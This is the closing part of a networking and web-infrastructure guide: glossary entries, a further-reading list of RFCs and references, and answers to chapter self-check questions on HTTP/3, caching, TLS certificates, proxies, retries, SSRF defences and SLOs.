and forwarding them to backends the client never sees directly (Nginx,
Envoy, Cloudflare).

**S-NAT (Source NAT)** — rewriting a packet's source address; your home
router uses this to share one public IP among many private devices.

**Service Mesh** — a sidecar-proxy architecture (e.g., Envoy) that handles
mTLS, retries, and tracing between microservices transparently, without the
application code knowing.

**SLI (Site Local In)** — inbound traffic entering a datacenter from the
internet.

**SLO (Site Local Out)** — outbound traffic leaving a datacenter to the
internet; for media platforms, typically 3–50× larger than SLI.

**SNI (Server Name Indication)** — the hostname the client sends in
plaintext during the TLS handshake, so a server hosting many sites on one
IP knows which certificate to present.

**SSL Termination** — decrypting TLS at an edge proxy or load balancer
rather than at the origin server, so the edge can inspect, cache, and
route based on the plaintext request.

**TCP (Transmission Control Protocol)** — the reliable, ordered,
connection-oriented transport protocol underlying HTTP/1.1 and HTTP/2; uses
sequence numbers, ACKs, and retransmission to deliver an ordered byte stream
while the connection remains healthy.

**TLS (Transport Layer Security)** — the protocol that encrypts,
authenticates, and integrity-protects a connection; HTTPS is HTTP running
inside TLS.

**UDP (User Datagram Protocol)** — a fast, connectionless, unreliable
transport protocol; used by DNS and as the foundation QUIC builds
reliability on top of.

**VIP (Virtual IP Address)** — an IP address not permanently bound to one
physical server, allowing transparent failover between whichever server or
router currently holds it.

**VRRP (Virtual Router Redundancy Protocol)** — a protocol letting multiple
physical routers share one virtual IP, so a backup can take over within
seconds if the master fails.

**WAF (Web Application Firewall)** — a layer that inspects HTTP requests
for known attack patterns (SQLi, XSS, path traversal) before they reach the
application.

---

# Appendix B — Further reading

**Specifications (the ground truth):**
- RFC 9110 — HTTP Semantics
- RFC 9113 — HTTP/2
- RFC 9114 — HTTP/3
- RFC 9000 — QUIC
- RFC 8446 — TLS 1.3
- RFC 1035 — Domain Names (DNS)
- RFC 9460 — SVCB and HTTPS DNS resource records
- RFC 8305 — Happy Eyeballs v2
- RFC 8484 — DNS Queries over HTTPS (DoH)
- RFC 4271 — BGP-4
- RFC 5798 — VRRP
- RFC 6265 — HTTP State Management Mechanism (cookies)
- RFC 7519 — JSON Web Token (JWT)

**Books and long-form references:**
- *High Performance Browser Networking* by Ilya Grigorik (free online) —
  TCP, TLS, HTTP/2 performance in depth, from the engineer who helped
  design several of them.
- *Computer Networking: A Top-Down Approach* — the standard networking
  textbook; good for the theory underneath Parts 1–4 of this guide.

**Living references (things that change — check these, not a cached memory of them):**
- MDN Web Docs (developer.mozilla.org) — the definitive reference for
  HTTP headers, CORS, CSP, and cookies.
- web.dev (web.dev, by Google) — Core Web Vitals and rendering performance,
  kept current as the metrics evolve.
- Cloudflare Learning Center (cloudflare.com/learning) — clear, accurate
  explainers on DNS, CDNs, DDoS, and TLS, from a company that operates all
  of them at scale.
- OWASP Top 10 (owasp.org) — the standard reference for the web attack
  classes in Chapter 12.
- Envoy and Nginx official documentation — for the proxy configuration
  patterns in Chapters 8 and 9.

**In this wiki:**
- [Networking from Zero (TCP/IP)](../networking/tcp-ip/real-life-guide-v1.md):
  hands-on companion for Parts 1–4 (home lab, packet captures, subnetting
  practice, Go labs).
- [The OSI Model, One Click at a Time](../networking/real-life-example-osi.md):
  the layer-by-layer view of one request.
- [Operating Systems, Linux, and Containers](../os-linux/real-life-os-guide.md):
  the Linux networking stack and containers from the OS's own point of view.
- [Go — The Complete Field Guide](../Golang/real-life-golang-guide.md):
  the language used in Part 9's labs.
- [security/real-life-guide.md](../security/real-life-guide.md) and
  [security/real-life-security-guide-v1.md](../security/real-life-security-guide-v1.md):
  deeper security engineering than Chapter 12's survey.
- [scale-perf/real-life-scale-guide.md](../scale-perf/real-life-scale-guide.md):
  load-testing the load balancers and CDNs from Chapters 9–10.

---

# Appendix C — Answers to "Check yourself" (Chapters 14–25)

**Ch 14** (1) In the TLS handshake, via ALPN: the client lists protocols in
the ClientHello and the server picks one in its reply, which already has to
happen, so nothing extra is added. (2) The `Alt-Svc` response header (helps on
later visits) and the DNS `HTTPS` record (helps on the first visit, because
it's known before connecting). (3) "This connection can't serve that
hostname. Open a new connection for it", typically after connection
coalescing sent a request to the wrong server. (4) Go's standard library
has no HTTP/3, so a CDN or load balancer terminates QUIC for users and talks
HTTP/2 or HTTP/1.1 to the Go service.

**Ch 15** (1) `private`: only the user's browser may store it. `no-cache`:
anyone may store it but must revalidate before each use. `no-store`: nobody
stores it. (2) To give shared caches (CDNs) a different lifetime from browsers,
e.g. long at the edge (where you can purge) and short in browsers (where you
can't). (3) It saves transferring the body again. It doesn't save the round
trip or the origin's work to compute the validator. (4) If the origin uses an
unkeyed header (say `X-Forwarded-Host`) to build the response, one request
with a malicious value is cached under the normal key and served to everyone.

**Ch 16** (1) A wildcard covers names that may not exist yet, so the CA can't
fetch an HTTP token from each one; only control of the DNS zone (a TXT record)
proves control of all of them. (2) CAA *prevents* other CAs from issuing for
your domain; CT *detects* any certificate that was issued, including by CAs
that ignored CAA or by your own colleagues. (3) On macOS Go uses the OS
verifier, which fetches missing intermediates itself; Go's own verifier
(used on Linux) only uses what the server sent. (4) Full automation of
issuance *and* deployment everywhere, monitoring with tighter thresholds, and
no manual steps or keystores that someone updates by hand.

**Ch 17** (1) TCP connect took ~20 ms ≈ 1 RTT, and a TLS 1.3 handshake is ~1 RTT,
so 1.1 s means a stall such as loss and retransmission, an overloaded
terminator, or a large certificate flight. (2) Browser DevTools (Console and
Network): CORS is enforced by the browser on the response, and `curl` doesn't
apply browser policy. (3) It pins one hostname to one IP for one command while
keeping SNI and `Host` correct, so you can test a specific edge or backend
without changing the machine's DNS for everything else.

**Ch 19** (1) `ReadHeaderTimeout`: it bounds the whole header phase. `WriteTimeout`
only governs writing the response, which a slow-header client never reaches.
(2) Browsers ignore HSTS received over plain HTTP, because an attacker could
inject it; sending it only over TLS is correct and avoids confusion. (3)
`/healthz` keeps returning 200 (the process is fine, don't restart it);
`/readyz` returns 503 so the load balancer stops sending new requests.
(4) So the load balancer always closes idle connections first and never sends
a request on a connection the server is closing (the 502 race).

**Ch 20** (1) The entries appended by proxies you control, read from the
right, skipping your own proxies' addresses. Never the left-most, which the
client wrote. (2) `SetXForwarded` builds the headers from the real connection
after `Rewrite` has removed the client's versions; `Director` appends to
whatever the client sent. (3) Go's server resolves the framing (removing
`Content-Length` when `Transfer-Encoding` is present) before the handler runs,
so the handler can't see the conflict. (4) 504 means the backend accepted the
request but was too slow; 502 means the proxy couldn't get a valid response at
all (refused, reset, crashed, malformed).

**Ch 21** (1) Because the request can commit and *then* fail; a response cache
has no success to store, so only a key recorded with the side effect stops
the retry from repeating it. (2) Backoff spreads one client's retries over
time; jitter spreads *different* clients' retries apart so they don't arrive
in synchronised waves. (3) A cap on retries as a fraction of normal requests
(e.g. 20%), which guarantees retries can't multiply load by more than that
factor during an outage. (4) Closed (calls flow, failures counted) → Open
after a threshold (calls fail immediately) → Half-open after a cool-down (a
trial call is allowed) → Closed on success, or back to Open on failure.

**Ch 22** (1) Only at connect time is the final IP known: DNS may change
between check and fetch, and redirects introduce new destinations. (2) The
initial URL is public and passes; the server it reaches answers with a
redirect to an internal address, which a client that checked only the first
URL follows. (3) A stolen token request from an SSRF usually comes through
at least one extra hop (a proxy, a container bridge), and with a hop limit of
1 the token response never reaches it.

**Ch 23** (1) SLI: the fraction of requests that were good (for example
non-5xx and under 300 ms). SLO: the target for that fraction over a window
(99.9% over 30 days). Error budget: the bad fraction the SLO allows (0.1%),
to be spent deliberately. (2) The budget is being spent 14.4 times faster than
sustainable: 2% per hour, the whole monthly budget in about two days. (3) Both
windows must exceed the threshold; after the fix the 5-minute window is
clean, so the condition is false even though the 1-hour window still is.
(4) Budget left: ship features and take risks. Budget gone or burning fast:
prioritise reliability work until it recovers.

**Ch 24** (1) `WriteTimeout` covers the whole response, and a stream's
response never finishes, so the deadline set when the request started
expired at 3 s. (2) Idle timeouts on load balancers, proxies, and NAT devices
that close connections with no traffic. (3) When the client must send data
continuously or with low latency over the same connection (chat, games,
collaborative editing). For server-to-client updates, SSE is simpler and
proxy-friendlier.

**Ch 25** (1) Steps 2–5 (DNS, TCP, TLS), which only the first visit pays for;
step 9 shows the same request without them. If they dominate, the fixes are
connection reuse, preconnect, a CDN edge closer to users, or HTTP/3. (2) The
pre-flight gives a clear early answer, but DNS can change between the check
and the connection (rebinding), and redirects add new destinations; only the
check inside the dialer sees the address actually connected to. (3) The
pooled connection is deliberately kept open for reuse, alongside the
runtime's netpoller descriptors; it's a leak only if the count keeps growing
with each request.
